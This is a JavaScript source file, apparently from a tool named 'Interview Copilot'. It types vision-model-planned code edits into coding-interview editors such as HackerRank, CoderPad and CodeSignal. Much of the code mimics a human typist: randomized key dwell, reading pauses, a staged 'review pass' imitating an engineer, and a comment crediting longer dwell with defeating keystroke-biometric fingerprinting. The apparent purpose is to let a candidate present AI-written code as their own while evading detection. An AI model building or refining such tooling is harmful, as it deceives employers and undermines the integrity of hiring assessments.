// Two things this deliberately does NOT match, both found by testing it
// against real focused-element names rather than imagined ones:
//   • a bare "line number" — an editor's own accessible name can say
//     "editor, line numbers enabled"
//   • "gotoline" run together — that is an identifier, not a sentence,
//     and a file named goto_line.py would otherwise be read as a prompt
// Either mistake means typing digits straight into the candidate's code,
// so the wording has to be prompt-shaped: words, with a space.
const GOTO_LINE_PROMPT = /(type a line number|\bgo\s?to\s+line\b)/i;
// "(from 1 to 41)" — the document's real length, free, straight from the
// widget. Worth having: it is the only cheap ground truth we get about a
// document UIA will not show us.
const GOTO_LINE_RANGE = /from\s+\d+\s+to\s+(\d+)/i;

// Below this, walking from the top is quicker than opening a prompt —
// see the note at the call site in navigateToDocLine.
const GOTO_LINE_WORTH_IT = 13;

// Editors that have already told us they do not do this. Re-probing a
// chord that opened someone's find bar once per navigation would be a
// small horror; one refusal is enough.
const _gotoLineUnsupported = new Set();

async function autoTypeJumpToLine(target, ctx) {
  const { keyboard, Key, processName } = ctx;
  const who = String(processName || 'unknown').toLowerCase();
  if (_gotoLineUnsupported.has(who)) return false;

  // What was focused BEFORE the chord. A prompt opening means focus moves
  // to it; if focus never moved, nothing opened, whatever the name says.
  // Locale-independent, and it costs one read on a bridge that answers in
  // ~3ms.
  let beforeName = null;
  try {
    const b = await readFocusedViaUIA(700);
    beforeName = b ? String(b.elementName ?? '') : null;
  } catch (_) { beforeName = null; }

  await withHeldKey(keyboard, Key.LeftControl, async () => {
    await autoTypeNavSleep(5, 14);
    await autoTypePressWithDwell(keyboard, Key.G);
    await autoTypeNavSleep(5, 14);
  });
  // The widget has to render before it can be read.
  await autoTypeSleep(260 + Math.random() * 140);

  // Read twice if the first look finds nothing new. A single slow frame
  // would otherwise be read as "this editor has no go-to-line" and, worse,
  // remembered — disabling the jump for the rest of the session over one
  // missed render. The second look costs ~3ms on a live bridge.
  let name = '';
  let focusMoved = false;
  for (let attempt = 0; attempt < 2; attempt++) {
    let probe = null;
    try { probe = await readFocusedViaUIA(900); } catch (_) { probe = null; }
    name = String(probe?.elementName || '');
    focusMoved = beforeName === null || name !== beforeName;
    if (focusMoved && GOTO_LINE_PROMPT.test(name)) break;
    if (attempt === 0) await autoTypeSleep(180 + Math.random() * 120);
  }

  if (!focusMoved || !GOTO_LINE_PROMPT.test(name)) {
    // Not a line prompt. Could be a find bar, could be nothing at all.
    // Escape restores whatever was there; the caret has not moved and the
    // document has not been touched.
    await autoTypePressWithDwell(keyboard, Key.Escape);
    await autoTypeNavSleep(40, 90);
    _gotoLineUnsupported.add(who);
    console.log(`[auto-type] nav: "${processName}" has no go-to-line on Ctrl+G (focused element was "${name.slice(0, 60)}") — walking instead, and not asking again this session`);
    return false;
  }

  const maxLine = Number((GOTO_LINE_RANGE.exec(name) || [])[1]) || 0;
  if (maxLine && target > maxLine) {
    // The plan is aiming past the end of the file. Typing it would land
    // on the last line, silently, and the edit would go to the wrong
    // place. Better to bail out to the walk, which at least fails the
    // same way it always has.
    await autoTypePressWithDwell(keyboard, Key.Escape);
    await autoTypeNavSleep(40, 90);
    console.warn(`[auto-type] nav: target L${target} is past the end of the document (${maxLine} lines) — declining the jump`);
    return false;
  }

  // Typed at human speed: this is a real prompt someone is filling in.
  for (const ch of String(target)) {
    if (autoTypeAbort) { await autoTypePressWithDwell(keyboard, Key.Escape); return false; }
    await typeCharHumanly(keyboard, Key, ch);
    await autoTypeSleep(70 + Math.random() * 90);
  }
  await autoTypeSleep(120 + Math.random() * 160);
  await autoTypePressWithDwell(keyboard, Key.Enter);
  await autoTypeSleep(180 + Math.random() * 160);
  console.log(`[auto-type] nav: jumped straight to L${target}${maxLine ? ` (document has ${maxLine} lines)` : ''}`);
  return true;
}

// ── Why the caret's CURRENT line is not used as the anchor ──
//
// The obvious alternative to jumping is "read where the caret already is
// and walk the short distance". It was written, and then removed, because
// the two numbers are not in the same coordinate system:
//
//   • the planner emits DOCUMENT lines, read off the editor's gutter in
//     the screenshot (autoTypeVisionAgent.js: "1-indexed DOCUMENT line
//     number, read from the editor gutter")
//   • a caret line derived from UIA text is a UIA line, and on browser
//     editors UIA starts at the first EDITABLE line — below the locked
//     template rows the gutter is still counting
//
// Subtracting one from the other yields a delta that is silently wrong by
// however many template lines the page has, and the failure is the worst
// kind: it navigates confidently to the wrong place and deletes correct
// code. (That is the EvenStream/OddStream incident the orphaned
// navigateToUiaLine below was written for — against an older planner
// contract that did count in UIA lines. It no longer does.)
//
// Ctrl+G takes a DOCUMENT line, which is exactly what the planner gives
// us, so the jump needs no translation and cannot drift.

// Move to a document line the way someone already working in the file
// would: from where the caret is.
//
// `fromLine` is our own accounting — exact, free, and in the same
// DOCUMENT coordinates as the target, because both come from the plan.
// It is known for every op after the first, and null on the first, where
// it used to mean "reset to the top and count down": twenty-nine visible
// Down presses to reach line 30, on every run, before a character was
// typed. That first hop now jumps instead (navigateToDocLine).
//
// Short hops still walk. Below about half a screen the arrows are already
// faster than opening a prompt, and stepping a few rows is what someone
// working in the file actually does.
async function autoTypeGoToLine(targetLine, fromLine, ctx) {
  const { keyboard, Key } = ctx;
  const target = Math.max(1, targetLine | 0);
  if (Number.isInteger(fromLine) && fromLine >= 1) {
    const delta = target - fromLine;
    if (delta === 0) {
      await autoTypeGoToColumnZero(keyboard, Key);
      return;
    }
    if (Math.abs(delta) <= RELATIVE_NAV_MAX_LINES) {
      await autoTypeArrowRun(keyboard, delta > 0 ? Key.Down : Key.Up, Math.abs(delta));
      await autoTypeGoToColumnZero(keyboard, Key);
      console.log(`[auto-type] nav: walked ${delta > 0 ? 'down' : 'up'} ${Math.abs(delta)} line(s) from L${fromLine} to L${target} (no viewport reset)`);
      return;
    }
  }
  await navigateToDocLine(target, ctx);
}

// The beat between arriving somewhere and starting to edit. Long enough to
// read a few lines; log-normal so it varies the way attention does.
async function autoTypeReadRegionPause() {
  const d = Math.min(autoTypeLogNormal(900, 0.45), 4200);
  await autoTypeSleep(Math.round(d));
}

// ── Review pass ──
// An experienced engineer does not stop the instant the last character
// lands. They go back over what they changed — especially when the fix
// spanned separate places in the file — re-read each one, and only then
// settle. This walks back up through the edited regions, pauses on each,
// and returns to where the work ended.
//
// Navigation ONLY. It presses nothing that can modify the document, so it
// cannot damage a run that has already succeeded. Skipped for single-region
// edits, where there is nothing to go back and forth between.
async function autoTypeReviewPass(regions, endLine, ctx) {
  const { keyboard, Key } = ctx;
  try {
    // Earliest regions first when walking back up, and cap the tour so a
    // 12-op plan doesn't turn into a sightseeing trip.
    const stops = regions
      .map(r => r.line)
      .filter(n => Number.isInteger(n) && n >= 1)
      .sort((a, b) => a - b)
      .slice(0, 3);
    if (stops.length < 2) return false;

    // A pause before moving — the "am I done?" beat.
    await autoTypeSleep(500 + Math.random() * 900);

    let at = Number.isInteger(endLine) ? endLine : null;
    for (let i = stops.length - 1; i >= 0; i--) {
      if (autoTypeAbort) return false;
      await autoTypeGoToLine(stops[i], at, ctx);
      at = stops[i];
      // Re-reading a region you just wrote is quicker than reading one you
      // haven't seen — you're checking, not comprehending.
      await autoTypeSleep(Math.round(Math.min(autoTypeLogNormal(650, 0.40), 2600)));
    }
    // Settle back where the work finished, so the caret is left somewhere
    // the candidate would expect it.
    if (Number.isInteger(endLine) && !autoTypeAbort) {
      await autoTypeGoToLine(endLine, at, ctx);
      await autoTypePressWithDwell(keyboard, Key.End);
      await autoTypeNavSleep(10, 24);
    }
    console.log(`[auto-type] review pass: revisited ${stops.length} edited region(s), settled back at L${endLine}`);
    return true;
  } catch (e) {
    console.warn('[auto-type] review pass failed (non-fatal):', e && e.message);
    return false;
  }
}

async function navigateToDocLine(lineNum, ctx) {
  const { keyboard, Key } = ctx;
  const target = Math.max(1, lineNum | 0);

  // Ask for the line directly first — constant-time and exact where the
  // editor offers it, and it declines safely where it does not.
  //
  // Not for shallow targets, though. The jump costs a fixed ~1.2s (chord,
  // a beat for the widget to render, two digits typed at human speed,
  // Enter) while walking costs about 40ms per line after a ~340ms start.
  // Those cross near line 13, so below that the walk is genuinely quicker
  // AND shorter to watch — a three-line hop is not the crawl anyone was
  // complaining about. Measured in real VS Code: 3.9s to walk to L47,
  // against ~1.2s to jump there.
  if (target >= GOTO_LINE_WORTH_IT && await autoTypeJumpToLine(target, ctx)) {
    await autoTypeGoToColumnZero(keyboard, Key);
    return;
  }

  // Ctrl+Home combo — hold Ctrl, press Home WITH DWELL (P1a), release Home,
  // release Ctrl. Real human key dwell of ~85ms instead of the previous
  // 5-14ms — closes the #1 keystroke-biometric fingerprint signal.
  await withHeldKey(keyboard, Key.LeftControl, async () => {
    await autoTypeNavSleep(5, 14);
    await autoTypePressWithDwell(keyboard, Key.Home);
    await autoTypeNavSleep(5, 14);
  });
  await autoTypeNavSleep(30, 60);
  // Counted Downs — deterministic landing line — but at key-repeat cadence
  // once it's more than a hop. See autoTypeArrowRun.
  await autoTypeArrowRun(keyboard, Key.Down, target - 1);
  await autoTypeGoToColumnZero(keyboard, Key);
}

// ── navigateToUiaLine — the COORDINATE-SAFE navigator ──
//
// Why this exists: navigateToDocLine uses Ctrl+Home + Down×N to land on
// "document line N." On browser editors (HackerRank Monaco, CoderPad
// CodeMirror, CodeSignal), the editor often has LOCKED TEMPLATE LINES
// above the editable region — `class OddStream(object):`, imports, etc.
// — that are NOT included in UIA's TextPattern read. The vision planner
// counts lines from UIA's view (L1 = first editable line), but Ctrl+Home
// goes to the DOCUMENT top (above the template). So "navigateToDocLine(11)"
// in a HackerRank Python problem with 3 hidden template lines actually
// lands at planner's L8 — off by 3. The user-visible symptom: "the
// executor over-reaches and deletes correct code I wanted preserved"
// (the May-2026 EvenStream/OddStream incident captured in the JSONL log).
//
// Fix: read the cursor's CURRENT position via UIA (cursorOffset is in
// UIA-text coordinates — same as planner's), compute which UIA line
// the cursor sits on (1-indexed), then navigate with RELATIVE arrows
// (Up or Down) instead of an absolute Ctrl+Home reset. No path through
// the hidden template means no off-by-N. If UIA is unavailable for
// this read, fall back to navigateToDocLine — same legacy behavior
// (which is at least correct for native editors without hidden templates).
async function navigateToUiaLine(targetUiaLine, ctx) {
  const { keyboard, Key } = ctx;
  const target = Math.max(1, targetUiaLine | 0);

  // Best-effort UIA re-read. 800ms budget — short enough that a stuck
  // bridge doesn't stall the whole op, long enough for the common case.
  let uia = null;
  try { uia = await readFocusedViaUIA(800); } catch (_) { uia = null; }

  if (!uia || !uia.ok || typeof uia.text !== 'string' || typeof uia.cursorOffset !== 'number') {
    // UIA blind — Monaco/CodeMirror may genuinely not expose TextPattern
    // here. Fall through to the legacy absolute navigator. This editor
    // probably DOESN'T have hidden template (the bug only manifests on
    // browser editors with both UIA AND a partial-text exposure), so the
    // legacy path is likely fine.
    console.warn(`[auto-type] navigateToUiaLine(${target}): UIA unavailable, falling back to navigateToDocLine (absolute, may miscount on browser editors with hidden template)`);
    return navigateToDocLine(target, ctx);
  }

  // Compute current cursor's UIA line. cursorOffset is in code units of
  // uia.text; counting newlines before the offset gives the 1-indexed
  // line number the cursor sits on (or just past — both yield the
  // correct cursor line for navigation purposes).
  const prefix = uia.text.slice(0, uia.cursorOffset);
  const currentLine = prefix.split('\n').length;
  const totalUiaLines = uia.text.split('\n').length;
  const delta = target - currentLine;

  // ── Flat-UIA detection ──
  // Some editors (notably the new Windows 11 Notepad / Store app) flatten
  // line breaks through UIA's TextPattern — uia.text comes back as a
  // single logical "line" even though the user sees many visual rows.
  // In that mode, currentLine is always 1 and our relative-delta math
  // is meaningless (the cursor's REAL visual line is unknowable from
  // the flat UIA snapshot). The planner, per the updated vision prompt,
  // numbers lines by what it sees in the SCREENSHOT — so its "target L3"
  // means visual line 3 from the top of the doc, which Ctrl+Home +
  // Down×(target-1) actually reaches in Notepad-style editors.
  //
  // Fall back to navigateToDocLine (absolute Ctrl+Home + Down) when:
  //   • UIA reports a single flat line (totalUiaLines === 1), AND
  //   • the planner is asking for a line > 1 (the case where relative
  //     navigation would mis-anchor).
  //
  // For multi-line UIA (HackerRank / CoderPad with proper newlines)
  // we still use relative navigation — that's where the off-by-template
  // bug lives and the relative fix correctly avoids it.
  if (totalUiaLines === 1 && target > 1) {
    console.log(`[auto-type] navigateToUiaLine: flat UIA detected (uia.text = 1 logical line, ${uia.text.length} chars), target L${target} > 1 — falling back to absolute Ctrl+Home navigation (safe in Notepad-style editors with no hidden template)`);
    return navigateToDocLine(target, ctx);
  }

  console.log(`[auto-type] navigateToUiaLine: cursor at UIA L${currentLine} (offset ${uia.cursorOffset} of ${uia.text.length}, totalLines=${totalUiaLines}), target L${target}, delta=${delta}`);

  if (delta === 0) {
    // Already on the right line — just snap to column 0.
    await autoTypeGoToColumnZero(keyboard, Key);
    return;
  }

  // Sanity rail: a delta > 200 lines almost certainly means the planner
  // emitted a bogus line number (or UIA misreported cursor). Log loudly
  // but still attempt — capping silently would mis-navigate. The structural
  // -line filter and no-op detection guard further damage downstream.
  if (Math.abs(delta) > 200) {
    console.warn(`[auto-type] navigateToUiaLine: SUSPICIOUSLY LARGE delta=${delta} — possible planner bug or UIA cursor desync. Attempting anyway.`);
  }

  await autoTypeArrowRun(keyboard, delta > 0 ? Key.Down : Key.Up, Math.abs(delta));
  await autoTypeGoToColumnZero(keyboard, Key);
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  RE-INDENTING A LINE THAT LANDED WRONG
//
//  Runs immediately after a block is typed, while we still know exactly
//  where that block is. That timing is the whole design:
//
//  ── HOW THE COORDINATE TRAP IS AVOIDED ──
//  The obvious way to fix line N is to look up its line number in the
//  editor text we just read. That number is a UIA line, and on browser
//  editors UIA starts at the first EDITABLE line while the gutter is
//  still counting locked template rows above it — so navigating to it
//  goes somewhere else and retypes over correct code.
//
//  We never compute one. The block we just typed occupies DOCUMENT lines
//  startLine .. startLine+n-1, straight from the plan, in the same
//  coordinates autoTypeGoToLine already navigates in. The editor read is
//  used ONLY to decide WHICH intended line is wrong, matched by content.
//  Line numbers never cross the boundary between the two systems.
//
//  ── WHY WHOLE LINES, NOT THE WHITESPACE ──
//  Deleting "the first 8 characters because they should be whitespace"
//  eats code the moment the count is off by one. Selecting the line and
//  typing the intended one is the same operation a normal replace op
//  performs, through the same tested primitives, and the result is
//  correct even if the selection was not what we expected.
//
//  ── WHAT IT REFUSES ──
//  • a non-zero block offset — the whole block sits deeper than written
//    (valid, the editor placed it), so retyping ONE line at the intended
//    indent would leave that line out of step with its neighbours
//  • more than MAX_INDENT_FIXES lines — that many is not a stray line,
//    it is something systemic, and flailing at it makes things worse
//  • anything it cannot re-verify afterwards
//  Every refusal falls through to telling the user, which is what
//  happened before this existed.
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
const MAX_INDENT_FIXES = 4;

async function autoTypeFixIndentation(lines, startLine, fromLine, ctx) {
  const { keyboard, Key } = ctx;
  if (!Array.isArray(lines) || lines.length === 0) return { fixed: 0, caretLine: fromLine };

  let snap = null;
  try { snap = await readFocusedViaUIA(1200); } catch (_) { snap = null; }
  if (!snap || !snap.ok || typeof snap.text !== 'string' || snap.text.indexOf('\n') === -1) {
    return { fixed: 0, caretLine: fromLine, reason: 'no_readable_text' };
  }

  const intended = lines.join('\n');
  const result = compareIndentation(intended, snap.text);
  if (!shouldReportIndent(result)) return { fixed: 0, caretLine: fromLine, reason: 'nothing_to_fix' };

  if (result.offset !== 0) {
    console.warn(`[auto-type] indent: block sits ${result.offset > 0 ? '+' : ''}${result.offset} from written, and ${result.mismatches.length} line(s) break its shape — not retyping, since fixing one line to the written indent would leave it out of step with the rest.`);
    return { fixed: 0, caretLine: fromLine, mismatches: result.mismatches, reason: 'block_offset' };
  }

  // Which of OUR lines are wrong. Matched by content, and only where that
  // content occurs once in the block — otherwise we cannot say which
  // occurrence the editor read was talking about.
  const stripWs = (s) => String(s).replace(/\s+/g, '');
  const targets = [];
  for (const m of result.mismatches) {
    const key = stripWs(m.line);
    const hits = [];
    for (let i = 0; i < lines.length; i++) if (stripWs(lines[i]) === key) hits.push(i);
    if (hits.length === 1) targets.push({ index: hits[0], line: lines[hits[0]] });
  }
  if (targets.length === 0) return { fixed: 0, caretLine: fromLine, mismatches: result.mismatches, reason: 'not_locatable' };
  if (targets.length > MAX_INDENT_FIXES) {
    console.warn(`[auto-type] indent: ${targets.length} line(s) off-shape — too many to be a stray, not retyping.`);
    return { fixed: 0, caretLine: fromLine, mismatches: result.mismatches, reason: 'too_many' };
  }

  targets.sort((a, b) => a.index - b.index);
  let caret = fromLine;
  let fixed = 0;
  for (const t of targets) {
    if (autoTypeAbort) break;
    const docLine = startLine + t.index;               // plan coordinates, start to finish
    await autoTypeGoToLine(docLine, caret, ctx);
    // Same select-and-replace a one-line op performs.
    await selectLineRangeContent(docLine, docLine, ctx);
    await autoTypeSleep(120 + Math.random() * 180);
    await autoTypePressWithDwell(keyboard, Key.Delete);
    await autoTypeNavSleep(18, 38);
    await typeLinesHumanized([t.line], ctx);
    caret = docLine;
    fixed++;
    console.log(`[auto-type] indent: retyped L${docLine} at the written indent — "${t.line.trim().slice(0, 40)}"`);
  }

  // Did it actually take? A fix reported without checking is exactly the
  // silent-success this whole check exists to remove.
  let after = null;
  try { after = await readFocusedViaUIA(1200); } catch (_) { after = null; }
  const recheck = (after && after.ok && typeof after.text === 'string')
    ? compareIndentation(intended, after.text)
    : null;
  const stillWrong = recheck ? shouldReportIndent(recheck) : true;

  return {
    fixed,
    caretLine: caret,
    verified: !!recheck && !stillWrong,
    mismatches: stillWrong ? (recheck ? recheck.mismatches : result.mismatches) : [],
    reason: stillWrong ? (recheck ? 'still_wrong' : 'unverified') : 'fixed',
  };
}

// Select the CONTENT of document lines [s..e] — from (s,0) through the
// END of line e, NOT including the newline after line e. Caret must
// already be at (s,0). After this the selection is live; caller Deletes.
//   replace: Delete then type → new content lands, line e+1 stays put.
//   delete : Delete then one more Delete → consumes the now-orphan
//            newline so the lines are fully gone, not left blank.
async function selectLineRangeContent(s, e, ctx) {
  const { keyboard, Key } = ctx;
  const span = Math.max(0, (e | 0) - (s | 0));
  // Shift stays held across the run — that's the natural pattern for range
  // selection, and holding Shift+Down is exactly what a person does to grab
  // a block. autoTypeArrowRun only touches the arrow key, so the modifier
  // is unaffected; it just stops the selection being tapped out one
  // deliberate row at a time on a 30-line range.
  // This is the LONGEST hold in the file — a whole arrow run plus an End —
  // so it is also the one with the most chances to throw partway through.
  await withHeldKey(keyboard, Key.LeftShift, async () => {
    await autoTypeHumanNavSleep();
    await autoTypeArrowRun(keyboard, Key.Down, span);
    await autoTypePressWithDwell(keyboard, Key.End);
    await autoTypeHumanNavSleep();
  });
  await autoTypeNavSleep(10, 22);
}

// Execute an ordered list of edit operations. Sorted BOTTOM-TO-TOP so an
// edit never shifts the line numbers of an edit still pending above it.
// Returns { typed, opCount } — `typed` is the concatenation of everything
// we typed, for the post-run log.
// Best-effort "is focus still on a non-self editor" check, run between
// multi-op steps. Returns false ONLY when UIA gives us a clean signal
// that focus is on our own process; on any uncertainty (bridge missing,
// timeout, parse error, etc.) returns true so we don't false-abort.
// Tight 450ms budget — this fires per-op and must not stall the run.
async function checkFocusStillOnEditor() {
  try {
    const uia = await readFocusedViaUIA(450);
    if (!uia) return true;
    if (!uia.ok && (
      uia.error === 'bridge_unavailable' || uia.error === 'not_ready_timeout' ||
      uia.error === 'timeout' || uia.error === 'parse_error' ||
      uia.error === 'write_failed' || uia.error === 'bridge_exited'
    )) {
      return true;
    }
    const ourPid = process.pid;
    if (Number.isInteger(uia.processId) && uia.processId === ourPid) return false;
    const pname = (uia.processName || '').toLowerCase();
    if (pname.startsWith('interview copilot') || pname.startsWith('interviewcopilot')) return false;
    return true;
  } catch (_) {
    return true;
  }
}

// Detects whether a line of code contains a STRUCTURAL declaration that
// would be catastrophic to delete (class, method signature, import, etc).
// Used by executeMultiOpPlan to refuse ops where the vision planner has
// miscounted blank lines and would target a structural line by mistake.
function autoTypeIsStructuralLine(line) {
  const t = (line || '').trim();
  if (!t) return false;
  // Java / C# / C++ method signatures: visibility modifiers + return + name(
  if (/^(public|private|protected|static|final|abstract|override|async)\b.*\b\w+\s*\(/.test(t)) return true;
  if (/\bpublic\s+(static\s+)?\w[\w<>\[\],\s]*\s+\w+\s*\(/.test(t)) return true;
  // Python def / class
  if (/^(def|class|async\s+def)\s+\w+/.test(t)) return true;
  // JavaScript function / class / arrow functions assigned to a name
  if (/^(function|class|async\s+function)\s+\w+/.test(t)) return true;
  if (/^(const|let|var)\s+\w+\s*=\s*(\([^)]*\)|\basync\s*(\([^)]*\))?)\s*=>/.test(t)) return true;
  // C-family functions: return-type name(...)
  if (/^(int|void|char|float|double|bool|short|long|unsigned|signed|String|String\[\])\s+\w+\s*\(/.test(t)) return true;
  // Imports / includes / package declarations
  if (/^(import|from|using|#include|#import|package|namespace)\b/.test(t)) return true;
  // Class declaration shorthand without modifier
  if (/^class\s+\w+/.test(t)) return true;
  return false;
}

async function executeMultiOpPlan(operations, ctx) {
  const { keyboard, Key, uiaText, processName } = ctx;
  // Browser-hosted editors (Monaco on HackerRank/CodeSignal, CodeMirror on
  // CoderPad) expose only a truncated slice of the document to UIA. That
  // distinction matters for the flat-UIA Ctrl+A guard below: a single-line
  // UIA read from a BROWSER is almost always truncation, not a genuinely
  // one-line document, so a whole-doc Ctrl+A nuke there would destroy code
  // we can't even see. Native flat editors (Notepad) are the only safe
  // target for the Ctrl+A path.
  const browserHosted = /(^|\b)(chrome|msedge|edge|firefox|brave|opera|vivaldi|arc)(\b|$)/i.test(String(processName || ''));

  // ── Validate operations (overlap check only) ──
  // Earlier I tried to also drop ops whose start_line was past
  // uiaLineCount (= uiaSnapshotBefore.text.split('\n').length). That was
  // WRONG and produced the "stopped after thinking" bug:
  //   - Vision reads line numbers from the editor's GUTTER in a
  //     screenshot — those are the real document line numbers.
  //   - UIA, on browser-hosted editors (Monaco / CodeMirror), often
  //     only exposes a small visible/focused slice of the document via
  //     TextPattern. So uiaLineCount routinely UNDERSTATES the real doc
  //     size. Filtering against it dropped legitimate ops anchored to
  //     real (but UIA-invisible) lines — a "replace L25-26" on a real
  //     30-line file would be dropped because UIA only saw 12 lines.
  //   - The vision agent saw the gutter; its line numbers ARE the
  //     authoritative ones. There's no reliable second source to
  //     validate against.
  // The original concern (model hallucinates a line past the file end)
  // is a real but rare risk that can't be safely detected from UIA;
  // better to trust the model than drop valid ops in the common case.
  //
  // Overlap is still safe to check — it's purely op-vs-op, needs no
  // editor knowledge. Two overlapping replace/delete ops executed
  // bottom-to-top scramble line numbers and corrupt the file. Drop the
  // later (lower start_line) one — the earlier (higher start_line) one
  // runs first under bottom-to-top order and the lower one would then
  // mis-anchor against shifted lines.
  const sortedAsc = (Array.isArray(operations) ? operations.slice() : [])
    .sort((a, b) => a.start_line - b.start_line);
  const validated = [];
  for (const op of sortedAsc) {
    const last = validated[validated.length - 1];
    if (last && op.op !== 'insert' && last.op !== 'insert'
        && op.start_line <= last.end_line) {
      console.warn(`[auto-type] multi-op: DROPPING overlapping ${op.op} L${op.start_line}-${op.end_line} (conflicts with prior L${last.start_line}-${last.end_line})`);
      continue;
    }
    validated.push(op);
  }
  if (validated.length === 0) {
    console.warn('[auto-type] multi-op: all ops dropped by validation — nothing to do');
    return { typed: '', opCount: 0, executionTrace: [{ kind: 'no_ops', reason: 'all_dropped_by_overlap_validation' }] };
  }
  if (validated.length !== (operations || []).length) {
    console.log(`[auto-type] multi-op: ${operations.length - validated.length} op(s) dropped by validation, ${validated.length} will execute`);
  }

  // ── Structural-line safety filter ──
  // Vision occasionally MISCOUNTS blank lines and emits line numbers that
  // are off by one (or more), causing replace/delete to target a line
  // containing a class/method/import declaration instead of the intended
  // stub/junk. The user-visible symptom: "Auto-Type cleared my main()
  // signature." We have the editor's text from UIA — use it to refuse any
  // op that would delete a structural line WITHOUT preserving that
  // structure in the replacement text.
  //
  // When uiaText is unavailable (UIA-blind editor), we skip this check —
  // the vision planner's gutter reading is our only source of truth then.
  const uiaLines = (typeof uiaText === 'string' && uiaText.length > 0)
    ? uiaText.split('\n')
    : null;
  const ops = validated.sort((a, b) => b.start_line - a.start_line);
  const safeOps = [];
  for (const op of ops) {
    if (!uiaLines || op.op === 'insert') { safeOps.push(op); continue; }
    let structuralLineHit = null;
    for (let lineNum = op.start_line; lineNum <= op.end_line && lineNum <= uiaLines.length; lineNum++) {
      const content = uiaLines[lineNum - 1] || '';
      if (!autoTypeIsStructuralLine(content)) continue;
      // Is the same structural keyword preserved in the op's replacement?
      const opText = String(op.text || '');
      const m = content.trim().match(/(public\s+(static\s+)?[\w<>\[\],\s]*\s+\w+\s*\(|class\s+\w+|def\s+\w+|function\s+\w+|import\s+\S+|package\s+\S+|using\s+\S+|#include\s+\S+)/);
      const keyword = m ? m[0].replace(/\s+/g, ' ').trim() : null;
      const opTextNormalized = opText.replace(/\s+/g, ' ');
      if (keyword && opTextNormalized.includes(keyword)) {
        // Replacement keeps the structural keyword — vision is legitimately
        // editing a method signature etc. Allow.
        continue;
      }
      structuralLineHit = { lineNum, content: content.trim().slice(0, 80) };
      break;
    }
    if (structuralLineHit) {
      console.warn(`[auto-type] multi-op: REFUSING ${op.op} L${op.start_line}-${op.end_line} — would delete structural line ${structuralLineHit.lineNum}: "${structuralLineHit.content}" without preserving it in the replacement. Vision likely miscounted blank lines.`);
      continue;
    }
    safeOps.push(op);
  }
  if (safeOps.length === 0) {
    console.warn('[auto-type] multi-op: all ops refused by structural-line safety filter — nothing safe to do');
    return { typed: '', opCount: 0, executionTrace: [{ kind: 'no_ops', reason: 'all_refused_by_structural_filter' }] };
  }
  if (safeOps.length !== ops.length) {
    console.log(`[auto-type] multi-op: structural-line filter dropped ${ops.length - safeOps.length} unsafe op(s); ${safeOps.length} will execute`);
  }

  // ── P8.6: NO-OP REWRITE DETECTION ──
  // Vision sometimes emits `replace L5-15` even when L5-15 ALREADY matches
  // the replacement text. The executor would then visibly delete + re-type
  // the same content — the "writing the same code again instead of
  // intelligently choosing where to write" symptom. Skip any replace whose
  // current editor content matches the replacement (per-line, trailing-
  // whitespace tolerant). Bottom-to-top execution order means uiaLines
  // (snapshot at session start) stays accurate for each op's turn —
  // earlier (lower) ops haven't yet shifted later (higher) lines.
  // The vision REPAIR pass already does this (search "SKIP NO-OP REWRITES");
  // adding it here closes the same gap on the primary planning path.
  const finalOps = [];
  let noOpSkipped = 0;
  const trimRight = (s) => String(s).replace(/[ \t]+$/, '');
  const linesEqualTrimRight = (curLines, txt) => {
    const tLines = String(txt).split('\n');
    if (curLines.length !== tLines.length) return false;
    for (let i = 0; i < curLines.length; i++) {
      if (trimRight(curLines[i]) !== trimRight(tLines[i])) return false;
    }
    return true;
  };
  for (const op of safeOps) {
    if (op.op === 'replace' && uiaLines && uiaLines.length > 0 && typeof op.text === 'string') {
      const startIdx = op.start_line - 1;
      const endIdx = op.end_line - 1;
      // Only attempt no-op detection when we have full coverage of the
      // target range in uiaLines (browser editors truncate UIA — partial
      // coverage = can't confirm match = execute conservatively).
      if (startIdx >= 0 && endIdx < uiaLines.length) {
        const currentLines = uiaLines.slice(startIdx, endIdx + 1);
        if (linesEqualTrimRight(currentLines, op.text)) {
          console.log(`[auto-type] multi-op: SKIPPING no-op rewrite — L${op.start_line}-${op.end_line} already matches the replacement text (${op.text.split('\n').length} line(s)). Reason was: "${(op.reason || '').slice(0, 60)}"`);
          noOpSkipped++;
          continue;
        }
      }
    }
    finalOps.push(op);
  }
  if (noOpSkipped > 0) {
    console.log(`[auto-type] multi-op: dropped ${noOpSkipped} no-op rewrite(s); ${finalOps.length} of ${safeOps.length} op(s) will actually execute`);
  }
  if (finalOps.length === 0) {
    console.log('[auto-type] multi-op: all ops were no-op rewrites — editor already matches target, nothing to type');
    return { typed: '', opCount: 0, executionTrace: [{ kind: 'no_ops', reason: 'all_no_op_rewrites' }] };
  }

  // ── Guard C: content-loss safety refusal (Stage 1) ──
  // Backstop for the "wholesale replace wiped my working code" class: if
  // the destructive ops (replace/delete) would NET-REMOVE the majority of
  // the editor's real (non-whitespace) characters without reproducing them
  // in the replacement text, refuse all destructive ops. Inserts are kept
  // — they can't delete anything.
  //
  // Reliability gate — runs ONLY when uiaText is trustworthy for measuring
  // "how much real code is in the editor":
  //   • NOT browser-hosted (browser UIA truncates → understates the total
  //     → would inflate the deletion ratio into a FALSE alarm; the 120-
  //     spaces browser disaster is handled by Guard D instead),
  //   • uiaLines present and multi-line (a 1-line read is flat/truncated),
  //   • every destructive op's range fully covered by uiaLines.
  // When the gate fails we self-disable and trust the vision plan — per
  // feedback_defensive_checks_premise, dropping legitimate work is worse
  // than the rare problem this prevents.
  const nonWs = (x) => String(x == null ? '' : x).replace(/\s+/g, '').length;
  const destructive = finalOps.filter(o => o.op === 'replace' || o.op === 'delete');
  const reliableUia = !browserHosted && uiaLines && uiaLines.length > 1
    && destructive.every(o => (o.start_line | 0) >= 1 && (o.end_line | 0) <= uiaLines.length);
  if (reliableUia && destructive.length > 0) {
    const totalNonWs = nonWs(uiaText);
    let removedNonWs = 0;
    let reproducedNonWs = 0;
    for (const o of destructive) {
      removedNonWs += nonWs(uiaLines.slice((o.start_line | 0) - 1, (o.end_line | 0)).join('\n'));
      if (o.op === 'replace') reproducedNonWs += nonWs(o.text);
    }
    const netRemoved = removedNonWs - reproducedNonWs;
    if (totalNonWs >= 30 && netRemoved > 0 && (netRemoved / totalNonWs) > 0.5) {
